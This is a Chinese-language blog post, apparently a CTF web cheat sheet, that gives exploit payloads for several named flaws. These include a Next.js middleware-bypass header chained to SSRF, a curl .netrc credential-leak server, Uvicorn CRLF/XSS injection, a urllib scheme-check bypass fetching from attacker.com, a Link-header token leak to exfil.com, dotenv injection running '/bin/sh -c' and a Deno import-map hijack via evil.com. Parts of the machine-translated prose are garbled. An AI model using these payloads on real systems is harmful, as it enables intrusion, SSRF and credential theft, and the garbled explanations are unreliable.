---
title: "cve"
date: 2026-03-21 22:55:35
categories: "WEB"
tags:
  - "WEB"
cover: /img/backgrounds/bg-11.png
top_img: /img/backgrounds/bg-11.png
disableNunjucks: true
---

## <font style="color:rgb(31, 35, 40);">CVE-2025-29927：Next.js中间件绕过</font>
**<font style="color:rgb(31, 35, 40);">受影响：</font>**<font style="color:rgb(31, 35, 40);">Next.js < 14.2.25，也包括15.x<15.2.3</font>

```plain
GET /protected/endpoint HTTP/1.1
Host: target
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

<font style="color:rgb(31, 35, 40);">绕过认证中间件，访问受保护端点，仅管理员路由。</font>

<font style="color:rgb(31, 35, 40);">与SSRF的连锁（Note Keeper，Pragyan 2026）：绕过中间件后，注入头部触发Next.js内部取用任意 URL：Location</font>

```plain
curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
     -H "Location: http://backend:4000/flag" \
     https://target/api/login
```

Next.js处理头部并在内部获取指定的URL，从而使SSRF能够访问内部服务。Location



## <font style="color:rgb(31, 35, 40);">CVE-2025-0167：Curl .netrc 凭证泄露</font>
服务器A（在）重定向到服务器B→如果B响应时，curl会向B发送凭证。.netrc401 + WWW-Authenticate: Basic

```plain
@app.route('/<path:path>')
def leak(path):
    return '', 401, {'WWW-Authenticate': 'Basic realm="leak"'}
```



## <font style="color:rgb(31, 35, 40);">Uvicorn CRLF注射（未补丁的N日）</font>
**<font style="color:rgb(31, 35, 40);">受影响：</font>**<font style="color:rgb(31, 35, 40);">Uvicorn（FastAPI 默认 ASGI 服务器）——被报告但被忽略。</font>

<font style="color:rgb(31, 35, 40);">Uvicorn 不会在响应头中对 CRLF 进行净化。启用条件：</font>

<font style="color:rgb(31, 35, 40);">CSP 绕过——注入破坏内容-安全-策略的头部</font>

<font style="color:rgb(31, 35, 40);">缓存中毒——破坏头部/主体边界，Nginx 缓存攻击者内容</font>

<font style="color:rgb(31, 35, 40);">XSS — 终止头部，其余为响应体\r\n\r\n</font>

```plain
payload = {"headers": {"lol\r\n\r\n<script>evil()</script>": "x"}}
requests.get(f'{HOST}/api/health', params={"test": json.dumps(payload)})
```

**<font style="color:rgb(31, 35, 40);">检测：</font>**<font style="color:rgb(31, 35, 40);">FastAPI/Uvicorn 后端 + 端点在响应头中反映用户输入。</font>

<font style="color:rgb(31, 35, 40);"></font>

## <font style="color:rgb(31, 35, 40);">Python urllib 方案验证绕过（0-day）</font>
受影响：Python —— 与不一致性的区别。urlliburlspliturlretrieve



urlsplit("<URL:[http://attacker.com/evil>").scheme](http://attacker.com/evil>").scheme)返回（空），但仍以HTTP形式获取。""urlretrieve

```plain
# App blocks http/https via urlsplit:
parsed = urlsplit(user_url)
if parsed.scheme in ['http', 'https']: raise Exception("Blocked")
# Bypass: <URL:http://attacker.com/malicious.so>
# Also: %0ahttp://attacker.com/malicious.so (newline prefix)
```

基于RFC 1738的遗留格式。

## <font style="color:rgb(31, 35, 40);">Chrome Referrer 通过 Link 头部泄露</font>
```plain
HTTP/1.1 200 OK
Link: <https://exfil.com/log>; rel="preload"; as="image"; referrerpolicy="unsafe-url"
```

Chrome 获取带有完整引用 URL 的链接资源→从中泄露令牌。/auth/callback?token=secret



## <font style="color:rgb(31, 35, 40);">TCP 分组（防火墙绕过）</font>
<font style="color:rgb(31, 35, 40);">跨TCP数据包边界的分割阻塞关键词：</font>

```plain
s = socket.socket(); s.connect((host, port))
s.send(b"GET /fla")
s.send(b"g.html HTTP/1.1\r\nHost: 127.0.0.1\r\nRange: bytes=135-\r\n\r\n")

```

## <font style="color:rgb(31, 35, 40);">Puppeteer/Chrome JavaScript 绕过</font>
```plain
page.setJavaScriptEnabled(false)只影响当前的语境。 从iframe中→新窗口启用了JS。window.open()
```

## <font style="color:rgb(31, 35, 40);">Python python-dotenv 注入</font>
<font style="color:rgb(31, 35, 40);">值的转义序列和换行：</font>

```plain
backup_server=x\'\nEVIL_VAR=malicious_value\n\'
```

用+链来表示RCE。 有关 PYTHONWARNINGS 技术细节，请参见 ctf-misc/pyjails.md。`PYTHONWARNINGS=ignore::antigravity.Foo::0``BROWSER=/bin/sh -c "cat /flag" %s`



## <font style="color:rgb(31, 35, 40);">通过RFC 2047进行HTTP请求拆分</font>
<font style="color:rgb(31, 35, 40);">CherryPy 解码 RFC 2047 头部→ CRLF 注入：</font>

```plain
payload = b"value\r\n\r\nGET /second HTTP/1.1\r\nHost: backend\r\n"
encoded = f"=?ISO-8859-1?B?{base64.b64encode(payload).decode()}?="
```

## <font style="color:rgb(31, 35, 40);">Deno 导入地图劫持事件</font>
Deno v1.18+ 会自动发现。通过原型污染：deno.json

```plain
({}).__proto__["deno.json"] = '{"importMap": "https://evil.com/map.json"}'
```



